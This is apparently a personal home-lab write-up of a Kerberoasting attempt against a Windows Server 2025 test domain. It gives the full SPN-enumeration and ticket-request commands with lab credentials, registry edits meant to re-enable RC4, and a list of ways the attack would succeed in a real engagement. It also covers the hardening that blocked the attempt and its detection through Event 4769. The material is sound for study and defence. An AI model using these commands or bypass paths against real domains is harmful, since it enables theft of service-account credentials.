# Kerberoasting — svc-backup (T1558.003)

**ATT&CK Technique:** [T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)  
**Tactic:** Credential Access  
**Environment:** TLOA Lab (`tloa.local`)  
**DC OS:** Windows Server 2025 (Build 26100)  
**Target Account:** `svc-backup` (SPN: `MSSQLSvc/dc01.tloa.local:1433`)  
**Date:** 2026-04-22  
**Status:** ✅ Complete — partial execution with hardening findings  

---

## Objective

Request a Kerberos TGS ticket for the `svc-backup` service account (Kerberoastable — SPN configured), extract the hash, and attempt offline cracking with hashcat — simulating a realistic Kerberoasting attack chain against a modern Active Directory environment.

---

## Tools Used

| Tool | Version | Purpose |
|---|---|---|
| Impacket (`GetUserSPNs.py`) | v0.14.0 | SPN enumeration and TGS request |
| NetExec | Latest | LDAP-based Kerberoasting |
| targetedKerberoast | Latest | AES-aware Kerberoasting |
| `kinit` / `klist` | MIT Kerberos | TGT acquisition and verification |
| hashcat | Latest | Offline hash cracking (planned) |

---

## Execution

### Step 1 — SPN Enumeration ✅

Enumerated Kerberoastable accounts from Kali using valid domain credentials:

```bash
impacket-GetUserSPNs tloa.local/higor:Tloa2025xLab -dc-ip 192.168.204.132
```

**Output:**

```
ServicePrincipalName          Name        MemberOf  PasswordLastSet              LastLogon  Delegation
----------------------------  ----------  --------  --------------------------  ---------  ----------
MSSQLSvc/dc01.tloa.local:1433 svc-backup            2026-04-03 19:46:56.376770  <never>
```

**Result:** `svc-backup` confirmed as Kerberoastable — SPN `MSSQLSvc/dc01.tloa.local:1433` registered, password never rotated, account never logged in. High-value target in a real engagement.

---

### Step 2 — TGS Request (RC4) ❌ Blocked

Attempted to request a TGS ticket and capture the hash in RC4 format (`$krb5tgs$23$`):

```bash
impacket-GetUserSPNs tloa.local/higor:Tloa2025xLab -dc-ip 192.168.204.132 -request -outputfile /home/kali/kerberoast.txt
```

**Error:**
```
[-] Principal: tloa.local\svc-backup - Kerberos SessionError:
KDC_ERR_ETYPE_NOSUPP (KDC has no support for encryption type)
```

**Root cause:** Windows Server 2025 disables RC4 encryption at the KDC level by default as part of its security hardening baseline. This prevents the classic Kerberoasting technique that relies on RC4 (`etype 23`) hashes.

---

### Step 3 — RC4 Re-enablement Attempts (Bypassed by OS)

Multiple attempts were made to re-enable RC4 at the DC level:

**Attempt 1 — Account-level encryption types:**
```powershell
Set-ADUser svc-backup -KerberosEncryptionType RC4,AES128,AES256
# msDS-SupportedEncryptionTypes result: 28 (unchanged — RC4 bit set but KDC ignores it)
```

**Attempt 2 — KDC registry key:**
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
    -Name "SupportedEncryptionTypes" -Value 0x7FFFFFFF -Type DWord
Restart-Computer -Force
# Result: KDC_ERR_ETYPE_NOSUPP persisted after reboot
```

**Attempt 3 — KDC service registry:**
```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Kdc" `
    -Name "DefaultEncryptionType" -Value 23 -PropertyType DWord -Force
Restart-Service -Name kdc -Force
# Result: KDC_ERR_ETYPE_NOSUPP persisted
```

**Attempt 4 — GPO policy check:**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters"
# Result: key does not exist — no GPO override present
```

**Conclusion:** Windows Server 2025 enforces RC4 deprecation at a kernel/KDC level that is not overridable through standard registry keys without additional OS-level policy changes. This is a documented Microsoft security improvement specifically designed to mitigate Kerberoasting.

---

### Step 4 — AES Kerberoasting Attempts ❌ Blocked by LDAP Signing

Attempted AES-based Kerberoasting using multiple tools:

**Attempt 1 — Impacket with Kerberos TGT:**
```bash
kinit higor@TLOA.LOCAL         # TGT obtained successfully ✅
impacket-GetUserSPNs tloa.local/higor:Tloa2025xLab -dc-ip 192.168.204.132 -request -k -no-pass
# Result: KDC_ERR_ETYPE_NOSUPP — Impacket negotiates RC4 by default even with -k flag
```

**Attempt 2 — NetExec LDAP:**
```bash
netexec ldap 192.168.204.132 -u higor -p Tloa2025xLab --kerberoasting /home/kali/kerberoast.txt
# Result: Error retrieving TGT — LDAP channel binding enforced (signing:Enforced)
```

**Attempt 3 — targetedKerberoast (AES-aware):**
```bash
python3 targetedKerberoast.py -d tloa.local -u higor -p Tloa2025xLab --dc-ip 192.168.204.132
# Result: automatic bind not successful - strongerAuthRequired
```

**Attempt 4 — targetedKerberoast with LDAPS:**
```bash
python3 targetedKerberoast.py -d tloa.local -u higor -p Tloa2025xLab --dc-ip 192.168.204.132 --use-ldaps
# Result: LDAPSocketOpenError: Connection reset by peer (no TLS certificate on DC)
```

**Root cause:** Windows Server 2025 enforces LDAP signing and channel binding by default. LDAPS (port 636) requires a valid TLS certificate on the DC, which is not configured in this lab environment.

---

## Environment Hardening Summary

| Control | Status | Impact on Attack |
|---|---|---|
| RC4 disabled at KDC | ✅ Enforced (WS2025 default) | Blocks classic Kerberoasting (`$krb5tgs$23$`) |
| LDAP signing enforced | ✅ Enforced (WS2025 default) | Blocks LDAP-based tools without signing support |
| LDAP channel binding | ✅ Enforced (WS2025 default) | Blocks unauthenticated/weak LDAP binds |
| LDAPS (port 636) | ❌ Not configured | No TLS cert on DC — blocks AES Kerberoasting via LDAPS |
| svc-backup SPN | ✅ Configured | Account remains Kerberoastable in principle |
| Password never rotated | ✅ Confirmed | High-value target if encryption barrier is bypassed |

---

## What Would Work in a Real Engagement

To successfully Kerberoast against a Windows Server 2025 DC, an attacker would need one of the following:

1. **Configure LDAPS on the DC** — install a TLS certificate and enable port 636, then use AES Kerberoasting tools
2. **Use Rubeus from a domain-joined Windows machine** — Rubeus handles AES natively and bypasses LDAP signing requirements by using the Windows Kerberos stack directly
3. **Downgrade via GPO** — modify `Network security: Configure encryption types allowed for Kerberos` via Group Policy (requires Domain Admin)
4. **Target a legacy DC** — Windows Server 2019 and earlier do not enforce RC4 deprecation by default

---

## Evidence

| Screenshot | Description |
|---|---|
| `img/01-spn-enumeration.png` | svc-backup identified as Kerberoastable |
| `img/02-rc4-blocked.png` | KDC_ERR_ETYPE_NOSUPP on TGS request |
| `img/03-registry-attempts.png` | RC4 re-enablement attempts on DC01 |
| `img/04-tgt-obtained.png` | kinit / klist — TGT successfully obtained |
| `img/05-ldap-signing-blocked.png` | strongerAuthRequired / LDAP channel binding error |
| `img/06-ldaps-connection-reset.png` | LDAPS connection reset — no TLS cert on DC |

---

## Detection — Wazuh / Sysmon

Even though the hash was not captured, the enumeration phase generates detectable events:

| SIEM | Alert | Event ID | Result |
|---|---|---|---|
| Windows Security | Kerberos Service Ticket Request | 4769 | ✅ Generated (enumeration) |
| Windows Security | Kerberos Pre-Auth Failed | 4771 | ⬜ Not triggered |
| Wazuh | LDAP enumeration anomaly | — | <!-- ✅ / ❌ --> |

### Key Indicator — Event 4769

Even a failed Kerberoasting attempt generates **Event ID 4769** during the SPN enumeration phase. A SOC analyst should look for:

- Multiple 4769 events from a non-service account (`higor`) in short succession
- `Ticket Encryption Type: 0x12` (AES256) or `0x17` (RC4) requests to service accounts
- Source IP that is not a known service host

---

## Lessons Learned

- **Windows Server 2025 effectively mitigates classic Kerberoasting** — RC4 is disabled at the KDC level by default, and this cannot be bypassed through standard registry modifications alone
- **SPN enumeration still works** — the attacker can identify Kerberoastable accounts (`svc-backup`) even without capturing hashes, which provides intelligence for other attack paths
- **LDAP signing + channel binding is enforced by default** — this blocks most modern Kerberoasting tools that rely on LDAP queries
- **AES Kerberoasting is the modern technique** — requires LDAPS (TLS certificate) or a domain-joined Windows attacker machine with Rubeus
- **The svc-backup account remains a risk** — password was never rotated (`PasswordLastSet: 2026-04-03`), never logged in (`LastLogon: <never>`), and has an MSSQL SPN. If RC4 were re-enabled or LDAPS configured, it would be immediately exploitable
- **Detection still applies** — SPN enumeration generates Event 4769 regardless of whether the hash is captured

---

## Next Steps for This Lab

To complete the AES Kerberoasting chain, the following lab changes would be needed:

```powershell
# On DC01 — Install AD CS or a self-signed cert and enable LDAPS
# Option 1: Install AD Certificate Services role
Install-WindowsFeature -Name AD-Certificate -IncludeManagementTools

# Option 2: Quick self-signed cert for LDAPS (lab only)
$cert = New-SelfSignedCertificate -DnsName "dc01.tloa.local" -CertStoreLocation "cert:\LocalMachine\My"
```

This is documented as a future lab improvement, not a blocker for the current exercise findings.

---

## References

- [MITRE ATT&CK — T1558.003](https://attack.mitre.org/techniques/T1558/003/)
- [Microsoft — RC4 deprecation in Windows Server 2025](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
- [Microsoft — LDAP channel binding and signing](https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a)
- [Impacket — GetUserSPNs](https://github.com/fortra/impacket)
- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Detecting Kerberoasting — Specterops](https://posts.specterops.io/detecting-kerberoasting-activity-b79d19bca7c5)
